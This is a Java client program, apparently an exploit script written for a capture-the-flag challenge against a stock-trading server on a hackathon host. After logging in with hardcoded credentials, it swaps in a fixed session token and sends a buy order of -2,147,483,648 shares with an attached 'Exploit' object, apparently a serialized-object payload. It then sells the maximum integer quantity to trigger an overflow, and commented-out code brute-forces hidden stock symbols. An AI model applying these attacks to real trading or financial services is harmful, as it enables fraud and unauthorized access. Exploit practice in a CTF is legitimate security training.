package myapp.ctf.client;

import myapp.ctf.client.ServerConnection;
import myapp.ctf.client.Exploit;

import com.ctf.stockapp.common.model.User;
import com.ctf.stockapp.common.model.Stock;
import com.ctf.stockapp.common.protocol.BuyRequest;
import com.ctf.stockapp.common.protocol.SellRequest;
import com.ctf.stockapp.common.protocol.GetBalanceRequest;
import com.ctf.stockapp.common.protocol.GetPortfolioRequest;
import com.ctf.stockapp.common.protocol.GetStocksRequest;
import com.ctf.stockapp.common.protocol.LoginRequest;
import com.ctf.stockapp.common.protocol.Request;
import com.ctf.stockapp.common.protocol.Response;


import java.text.DecimalFormat;
import java.util.stream.Stream;

public class Main {

    public static String username = "trader";
    public static String password = "trader123";
    public static String server = "team54-thickapp.durhack.qwerty.technology";
    public static int port = 9999;

    private static ServerConnection connection;
    private static String sessionToken;

    public static Response mySendRequest(Request request) {
        try {
            request.setSessionToken(sessionToken);
            return connection.sendRequest(request);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
            e.printStackTrace();
            System.exit(1);
            return null;
        }
    }

    public static void actions() {
        // Revert to a known session token
        sessionToken = "9e00c560-0e85-40ab-a0da-a38ec47c6337";

        DecimalFormat df = new DecimalFormat("#");
        df.setMaximumFractionDigits(8);
        {
            System.out.println("Requesting balance");
            GetBalanceRequest req = new GetBalanceRequest();
            Response resp = mySendRequest(req);
        }

        // {
        // char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
        // int maxLen = 4;
        // System.out.println("Trying all buy requests");
        // for (int len = 1; len <= maxLen; len++) {
        // int[] indices = new int[len];
        // while (true) {
        // // Build string
        // StringBuilder sb = new StringBuilder();
        // for (int idx : indices)
        // sb.append(alphabet[idx]);
        //
        // {
        // String symbol = sb.toString();
        // // BuyRequest req = new BuyRequest("AMZN", -2_147_483_648);
        // BuyRequest req = new BuyRequest(symbol, 1);
        // Response resp = mySendRequest(req);
        // System.out.println("Testing symbol: " + symbol);
        //
        // String[] a = {"MSFT","GOOGL","AAPL","TSLA", "AMZN"};
        // boolean contains = Stream.of(a).anyMatch(x -> x == symbol);
        // if (resp.isSuccess() && !contains) {
        // System.out.println("FOUND A NEW SYMBOL!! " + symbol);
        // break;
        // }
        // }
        //
        // // Increment indices like an odometer
        // int pos = len - 1;
        // while (pos >= 0 && ++indices[pos] == alphabet.length) {
        // indices[pos] = 0;
        // pos--;
        // }
        // if (pos < 0) break; // done for this length
        // }
        // }
        // }

        {
            System.out.println("BuyRequest");
            BuyRequest req = new BuyRequest("TSLA", -2_147_483_648);
            // BuyRequest req = new BuyRequest("DURHACK", -1);
            // BuyRequest req = new BuyRequest();
            req.setData(new Exploit());
            // req.setData(new Stock("AMZN", "", 10000));
            // req.setData(new User("name", "password", 0));
            // req.setStockSymbol("TSLA");
            // req.setQuantity(-2_147_483_648);
            Response resp = mySendRequest(req);
        }

        {
            System.out.println("GetStocksRequest");
            GetStocksRequest req = new GetStocksRequest();
            Response resp = mySendRequest(req);
        }

        {
            System.out.println("GetPortfolioRequest");
            GetPortfolioRequest req = new GetPortfolioRequest();
            Response resp = mySendRequest(req);
        }
        {
            System.out.println("SellRequest");
            SellRequest req = new SellRequest();
            req.setStockSymbol("TSLA");
            // req.setQuantity(-2_147_483_648);
            req.setQuantity(2_147_483_647);
            Response resp = mySendRequest(req);
        }
        {
            System.out.println("GetPortfolioRequest Again");
            GetPortfolioRequest req = new GetPortfolioRequest();
            Response resp = mySendRequest(req);
        }
        {
            System.out.println("GetBalanceRequest");
            GetBalanceRequest req = new GetBalanceRequest();
            Response resp = mySendRequest(req);
        }

        // Attempts at custom requests
        // {
        //     System.out.println("get user");
        //     GetUserRequest req = new GetUserRequest();
        //     Response resp = mySendRequest(req);
        // }

        // {
        //     System.out.println("Register");
        //     RegisterRequest req = new RegisterRequest("a", "b");
        //     Response resp = mySendRequest(req);
        // }

        connection.disconnect();

    }

    public static void main(String[] args) {
        connection = new ServerConnection(server,port);

        System.out.println("Attempting to login");

        try {
            LoginRequest request = new LoginRequest(username, password);
            Response response = connection.sendRequest(request);
            if (response.isSuccess()) {
                System.out.println("Login successful -> sessionToken: " + (String) response.getData());
                sessionToken = (String) response.getData();
                actions();
                return;
            } else {
                System.out
                        .println("Login failed:\nMessage: " + response.getMessage() + "\nData: " + response.getData());
                return;
            }
        } catch (Exception e) {
            System.out.println("Connection error:\nMessage: " + e.getMessage() + "\nCause: " + e.getCause());
            e.printStackTrace();
        }
    }
}
